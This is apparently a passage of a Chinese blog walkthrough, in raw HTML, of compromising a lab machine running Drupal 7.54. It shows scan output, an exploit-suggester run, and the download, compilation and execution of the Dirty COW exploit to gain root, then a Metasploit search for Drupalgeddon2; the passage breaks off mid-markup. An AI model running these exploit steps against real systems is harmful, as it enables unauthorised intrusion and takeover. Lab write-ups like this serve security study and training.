WARNING: Directory IS LISTABLE. No need to scan it.</span><br><span class="line">    (Use mode <span class="string">&#x27;-w&#x27;</span> <span class="keyword">if</span> you want to scan it anyway)</span><br><span class="line"></span><br><span class="line">---- Entering directory: http://10.0.0.102:1898/scripts/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.</span><br><span class="line">    (Use mode <span class="string">&#x27;-w&#x27;</span> <span class="keyword">if</span> you want to scan it anyway)</span><br><span class="line"></span><br><span class="line">---- Entering directory: http://10.0.0.102:1898/sites/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.</span><br><span class="line">    (Use mode <span class="string">&#x27;-w&#x27;</span> <span class="keyword">if</span> you want to scan it anyway)</span><br><span class="line"></span><br><span class="line">---- Entering directory: http://10.0.0.102:1898/themes/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.</span><br><span class="line">    (Use mode <span class="string">&#x27;-w&#x27;</span> <span class="keyword">if</span> you want to scan it anyway)</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">END_TIME: Fri Sep  2 15:19:08 2022</span><br><span class="line">DOWNLOADED: 4612 - FOUND: 5</span><br></pre></td></tr></table></figure><p>查看robots.txt</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># Files</span><br><span class="line">Disallow: /CHANGELOG.txt</span><br><span class="line">Disallow: /cron.php</span><br><span class="line">Disallow: /INSTALL.mysql.txt</span><br><span class="line">Disallow: /INSTALL.pgsql.txt</span><br><span class="line">Disallow: /INSTALL.sqlite.txt</span><br><span class="line">Disallow: /install.php</span><br><span class="line">Disallow: /INSTALL.txt</span><br><span class="line">Disallow: /LICENSE.txt</span><br><span class="line">Disallow: /MAINTAINERS.txt</span><br><span class="line">Disallow: /update.php</span><br><span class="line">Disallow: /UPGRADE.txt</span><br><span class="line">Disallow: /xmlrpc.php</span><br></pre></td></tr></table></figure><p><a href="http://10.0.0.102:1898/CHANGELOG.txt">http://10.0.0.102:1898/CHANGELOG.txt</a></p><p>访问此页面得知 此cms版本为7.54</p><h2 id="提权">提权</h2><h3 id="一-登录ssh提权">一.登录ssh提权</h3><p>下载 linux-exploit-suggester 检测</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># ssh tiago@10.0.0.102</span></span><br><span class="line">tiago@10.0.0.102<span class="string">&#x27;s password:</span></span><br><span class="line"><span class="string">Welcome to Ubuntu 14.04.5 LTS (GNU/Linux 4.4.0-31-generic i686)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> * Documentation:  https://help.ubuntu.com/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  System information as of Sat Sep  3 11:57:10 BRT 2022</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  System load: 0.32              Memory usage: 8%   Processes:       196</span></span><br><span class="line"><span class="string">  Usage of /:  7.8% of 19.07GB   Swap usage:   0%   Users logged in: 0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  Graph this data and manage this system at:</span></span><br><span class="line"><span class="string">    https://landscape.canonical.com/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">226 packages can be updated.</span></span><br><span class="line"><span class="string">177 updates are security updates.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">New release &#x27;</span>16.04.7 LTS<span class="string">&#x27; available.</span></span><br><span class="line"><span class="string">Run &#x27;</span>do-release-upgrade<span class="string">&#x27; to upgrade to it.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Last login: Sat Sep  3 02:59:12 2022 from kali.lan</span></span><br><span class="line"><span class="string">tiago@lampiao:~$ cd /tmp</span></span><br><span class="line"><span class="string">tiago@lampiao:/tmp$ wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh</span></span><br><span class="line"><span class="string">--2022-09-03 04:14:18--  https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh</span></span><br><span class="line"><span class="string">Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.109.133, 185.199.110.133, ...</span></span><br><span class="line"><span class="string">Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected.</span></span><br><span class="line"><span class="string">HTTP request sent, awaiting response... 200 OK</span></span><br><span class="line"><span class="string">Length: 89641 (88K) [text/plain]</span></span><br><span class="line"><span class="string">Saving to: ‘les.sh’</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">100%[==================================================================================&gt;] 89,641      33.1KB/s   in 2.6s</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">2022-09-03 04:14:22 (33.1 KB/s) - ‘les.sh’ saved [89641/89641]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">tiago@lampiao:/tmp$ chmod +x les.sh</span></span><br><span class="line"><span class="string">tiago@lampiao:/tmp$ ./les.sh</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Available information:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Kernel version: 4.4.0</span></span><br><span class="line"><span class="string">Architecture: i686</span></span><br><span class="line"><span class="string">Distribution: ubuntu</span></span><br><span class="line"><span class="string">Distribution version: 14.04</span></span><br><span class="line"><span class="string">Additional checks (CONFIG_*, sysctl entries, custom Bash commands): performed</span></span><br><span class="line"><span class="string">Package listing: from current OS</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Searching among:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">79 kernel space exploits</span></span><br><span class="line"><span class="string">49 user space exploits</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Possible Exploits:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] [CVE-2017-16995] eBPF_verifier</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   Details: https://ricklarabee.blogspot.com/2018/07/ebpf-and-analysis-of-get-rekt-linux.html</span></span><br><span class="line"><span class="string">   Exposure: highly probable</span></span><br><span class="line"><span class="string">   Tags: debian=9.0&#123;kernel:4.9.0-3-amd64&#125;,fedora=25|26|27,[ ubuntu=14.04 ]&#123;kernel:4.4.0-89-generic&#125;,ubuntu=(16.04|17.04)&#123;kernel:4.(8|10).0-(19|28|45)-generic&#125;</span></span><br><span class="line"><span class="string">   Download URL: https://www.exploit-db.com/download/45010</span></span><br><span class="line"><span class="string">   Comments: CONFIG_BPF_SYSCALL needs to be set &amp;&amp; kernel.unprivileged_bpf_disabled != 1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] [CVE-2017-1000112] NETIF_F_UFO</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   Details: http://www.openwall.com/lists/oss-security/2017/08/13/1</span></span><br><span class="line"><span class="string">   Exposure: highly probable</span></span><br><span class="line"><span class="string">   Tags: [ ubuntu=14.04&#123;kernel:4.4.0-*&#125; ],ubuntu=16.04&#123;kernel:4.8.0-*&#125;</span></span><br><span class="line"><span class="string">   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-1000112/poc.c</span></span><br><span class="line"><span class="string">   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2017-1000112/poc.c</span></span><br><span class="line"><span class="string">   Comments: CAP_NET_ADMIN cap or CONFIG_USER_NS=y needed. SMEP/KASLR bypass included. Modified version at &#x27;</span>ext-url<span class="string">&#x27; adds support for additional distros/kernels</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] [CVE-2016-8655] chocobo_root</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   Details: http://www.openwall.com/lists/oss-security/2016/12/06/1</span></span><br><span class="line"><span class="string">   Exposure: highly probable</span></span><br><span class="line"><span class="string">   Tags: [ ubuntu=(14.04|16.04)&#123;kernel:4.4.0-(21|22|24|28|31|34|36|38|42|43|45|47|51)-generic&#125; ]</span></span><br><span class="line"><span class="string">   Download URL: https://www.exploit-db.com/download/40871</span></span><br><span class="line"><span class="string">   Comments: CAP_NET_RAW capability is needed OR CONFIG_USER_NS=y needs to be enabled</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] [CVE-2016-5195] dirtycow</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails</span></span><br><span class="line"><span class="string">   Exposure: highly probable</span></span><br><span class="line"><span class="string">   Tags: debian=7|8,RHEL=5&#123;kernel:2.6.(18|24|33)-*&#125;,RHEL=6&#123;kernel:2.6.32-*|3.(0|2|6|8|10).*|2.6.33.9-rt31&#125;,RHEL=7&#123;kernel:3.10.0-*|4.2.0-0.21.el7&#125;,[ ubuntu=16.04|14.04|12.04 ]</span></span><br><span class="line"><span class="string">   Download URL: https://www.exploit-db.com/download/40611</span></span><br><span class="line"><span class="string">   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] [CVE-2016-5195] dirtycow 2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails</span></span><br><span class="line"><span class="string">   Exposure: highly probable</span></span><br><span class="line"><span class="string">   Tags: debian=7|8,RHEL=5|6|7,[ ubuntu=14.04|12.04 ],ubuntu=10.04&#123;kernel:2.6.32-21-generic&#125;,ubuntu=16.04&#123;kernel:4.4.0-21-generic&#125;</span></span><br><span class="line"><span class="string">   Download URL: https://www.exploit-db.com/download/40839</span></span><br><span class="line"><span class="string">   ext-url: https://www.exploit-db.com/download/40847</span></span><br><span class="line"><span class="string">   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] [CVE-2021-4034] PwnKit</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt</span></span><br><span class="line"><span class="string">   Exposure: probable</span></span><br><span class="line"><span class="string">   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro</span></span><br><span class="line"><span class="string">   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] [CVE-2021-3156] sudo Baron Samedit 2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt</span></span><br><span class="line"><span class="string">   Exposure: probable</span></span><br><span class="line"><span class="string">   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10</span></span><br><span class="line"><span class="string">   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] [CVE-2017-6074] dccp</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   Details: http://www.openwall.com/lists/oss-security/2017/02/22/3</span></span><br><span class="line"><span class="string">   Exposure: probable</span></span><br><span class="line"><span class="string">   Tags: [ ubuntu=(14.04|16.04) ]&#123;kernel:4.4.0-62-generic&#125;</span></span><br><span class="line"><span class="string">   Download URL: https://www.exploit-db.com/download/41458</span></span><br><span class="line"><span class="string">   Comments: Requires Kernel be built with CONFIG_IP_DCCP enabled. Includes partial SMEP/SMAP bypass</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] [CVE-2016-2384] usb-midi</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   Details: https://xairy.github.io/blog/2016/cve-2016-2384</span></span><br><span class="line"><span class="string">   Exposure: probable</span></span><br><span class="line"><span class="string">   Tags: [ ubuntu=14.04 ],fedora=22</span></span><br><span class="line"><span class="string">   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-2384/poc.c</span></span><br><span class="line"><span class="string">   Comments: Requires ability to plug in a malicious USB device and to execute a malicious binary as a non-privileged user</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] [CVE-2015-3202] fuse (fusermount)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   Details: http://seclists.org/oss-sec/2015/q2/520</span></span><br><span class="line"><span class="string">   Exposure: probable</span></span><br><span class="line"><span class="string">   Tags: debian=7.0|8.0,[ ubuntu=* ]</span></span><br><span class="line"><span class="string">   Download URL: https://www.exploit-db.com/download/37089</span></span><br><span class="line"><span class="string">   Comments: Needs cron or system admin interaction</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] [CVE-2015-1318] newpid (apport)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   Details: http://openwall.com/lists/oss-security/2015/04/14/4</span></span><br><span class="line"><span class="string">   Exposure: probable</span></span><br><span class="line"><span class="string">   Tags: [ ubuntu=14.04 ]</span></span><br><span class="line"><span class="string">   Download URL: https://gist.githubusercontent.com/taviso/0f02c255c13c5c113406/raw/eafac78dce51329b03bea7167f1271718bee4dcc/newpid.c</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] [CVE-2021-3156] sudo Baron Samedit</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt</span></span><br><span class="line"><span class="string">   Exposure: less probable</span></span><br><span class="line"><span class="string">   Tags: mint=19,ubuntu=18|20, debian=10</span></span><br><span class="line"><span class="string">   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] [CVE-2021-22555] Netfilter heap out-of-bounds write</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html</span></span><br><span class="line"><span class="string">   Exposure: less probable</span></span><br><span class="line"><span class="string">   Tags: ubuntu=20.04&#123;kernel:5.8.0-*&#125;</span></span><br><span class="line"><span class="string">   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c</span></span><br><span class="line"><span class="string">   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c</span></span><br><span class="line"><span class="string">   Comments: ip_tables kernel module must be loaded</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] [CVE-2019-18634] sudo pwfeedback</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   Details: https://dylankatz.com/Analysis-of-CVE-2019-18634/</span></span><br><span class="line"><span class="string">   Exposure: less probable</span></span><br><span class="line"><span class="string">   Tags: mint=19</span></span><br><span class="line"><span class="string">   Download URL: https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c</span></span><br><span class="line"><span class="string">   Comments: sudo configuration requires pwfeedback to be enabled.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] [CVE-2019-15666] XFRM_UAF</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   Details: https://duasynt.com/blog/ubuntu-centos-redhat-privesc</span></span><br><span class="line"><span class="string">   Exposure: less probable</span></span><br><span class="line"><span class="string">   Download URL:</span></span><br><span class="line"><span class="string">   Comments: CONFIG_USER_NS needs to be enabled; CONFIG_XFRM needs to be enabled</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] [CVE-2017-7308] af_packet</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   Details: https://googleprojectzero.blogspot.com/2017/05/exploiting-linux-kernel-via-packet.html</span></span><br><span class="line"><span class="string">   Exposure: less probable</span></span><br><span class="line"><span class="string">   Tags: ubuntu=16.04&#123;kernel:4.8.0-(34|36|39|41|42|44|45)-generic&#125;</span></span><br><span class="line"><span class="string">   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-7308/poc.c</span></span><br><span class="line"><span class="string">   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2017-7308/poc.c</span></span><br><span class="line"><span class="string">   Comments: CAP_NET_RAW cap or CONFIG_USER_NS=y needed. Modified version at &#x27;</span>ext-url<span class="string">&#x27; adds support for additional kernels</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] [CVE-2017-5618] setuid screen v4.5.0 LPE</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   Details: https://seclists.org/oss-sec/2017/q1/184</span></span><br><span class="line"><span class="string">   Exposure: less probable</span></span><br><span class="line"><span class="string">   Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] [CVE-2016-9793] SO_&#123;SND|RCV&#125;BUFFORCE</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   Details: https://github.com/xairy/kernel-exploits/tree/master/CVE-2016-9793</span></span><br><span class="line"><span class="string">   Exposure: less probable</span></span><br><span class="line"><span class="string">   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-9793/poc.c</span></span><br><span class="line"><span class="string">   Comments: CAP_NET_ADMIN caps OR CONFIG_USER_NS=y needed. No SMEP/SMAP/KASLR bypass included. Tested in QEMU only</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] [CVE-2016-4557] double-fdput()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=808</span></span><br><span class="line"><span class="string">   Exposure: less probable</span></span><br><span class="line"><span class="string">   Tags: ubuntu=16.04&#123;kernel:4.4.0-21-generic&#125;</span></span><br><span class="line"><span class="string">   Download URL: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/39772.zip</span></span><br><span class="line"><span class="string">   Comments: CONFIG_BPF_SYSCALL needs to be set &amp;&amp; kernel.unprivileged_bpf_disabled != 1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] [CVE-2015-1318] newpid (apport) 2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   Details: http://openwall.com/lists/oss-security/2015/04/14/4</span></span><br><span class="line"><span class="string">   Exposure: less probable</span></span><br><span class="line"><span class="string">   Tags: ubuntu=14.04.2</span></span><br><span class="line"><span class="string">   Download URL: https://www.exploit-db.com/download/36782</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] [CVE-2016-0728] keyring</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   Details: http://perception-point.io/2016/01/14/analysis-and-exploitation-of-a-linux-kernel-vulnerability-cve-2016-0728/</span></span><br><span class="line"><span class="string">   Exposure: less probable</span></span><br><span class="line"><span class="string">   Download URL: https://www.exploit-db.com/download/40003</span></span><br><span class="line"><span class="string">   Comments: Exploit takes about ~30 minutes to run. Exploit is not reliable, see: https://cyseclabs.com/blog/cve-2016-0728-poc-not-working</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">tiago@lampiao:/tmp$</span></span><br></pre></td></tr></table></figure><p>经过一一试用</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[+] [CVE-2016-5195] dirtycow 2 https://www.exploit-db.com/download/40847 能提权成功</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">wget https://www.exploit-db.com/raw/40847 -O 40847.cpp</span><br><span class="line">g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil</span><br><span class="line">./dcow -s</span><br><span class="line"></span><br><span class="line">tiago@lampiao:/tmp$ wget https://www.exploit-db.com/raw/40847 -O 40847.cpp</span><br><span class="line">--2022-09-03 04:19:22--  https://www.exploit-db.com/raw/40847</span><br><span class="line">Resolving www.exploit-db.com (www.exploit-db.com)... 192.124.249.13</span><br><span class="line">Connecting to www.exploit-db.com (www.exploit-db.com)|192.124.249.13|:443... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: unspecified [text/plain]</span><br><span class="line">Saving to: ‘40847.cpp’</span><br><span class="line"></span><br><span class="line">    [  &lt;=&gt;                                                                              ] 10,531      45.3KB/s   <span class="keyword">in</span> 0.2s</span><br><span class="line"></span><br><span class="line">2022-09-03 04:19:24 (45.3 KB/s) - ‘40847.cpp’ saved [10531]</span><br><span class="line"></span><br><span class="line">tiago@lampiao:/tmp$ g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil</span><br><span class="line">tiago@lampiao:/tmp$ ./dcow -s</span><br><span class="line">Running ...</span><br><span class="line">Password overridden to: dirtyCowFun</span><br><span class="line"></span><br><span class="line">Received su prompt (Password: )</span><br><span class="line"></span><br><span class="line">root@lampiao:~<span class="comment"># echo 0 &gt; /proc/sys/vm/dirty_writeback_centisecs</span></span><br><span class="line">root@lampiao:~<span class="comment"># cp /tmp/.ssh_bak /etc/passwd</span></span><br><span class="line">root@lampiao:~<span class="comment"># rm /tmp/.ssh_bak</span></span><br><span class="line">root@lampiao:~<span class="comment">#</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="二-使用Drupal-7-54-exp">二.使用Drupal 7.54 exp</h3><p>谷歌搜索到有CVE-2018-7600</p><p>使用msf</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; search CVE-2018-7600</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   <span class="comment">#  Name                                      Disclosure Date  Rank       Check  Description</span></span><br><span class="line">   -  ----                                      ---------------  ----       -----  -----------</span><br><span class="line">   0  exploit/unix/webapp/drupal_drupalgeddon2  2018-03-28       excellent  Yes    Drupal Drupalgeddon 2 Forms API Property Injection</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/webapp/drupal_drupalgeddon2</span><br><span class="line"></span><br><span class="line">msf6 &gt;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span 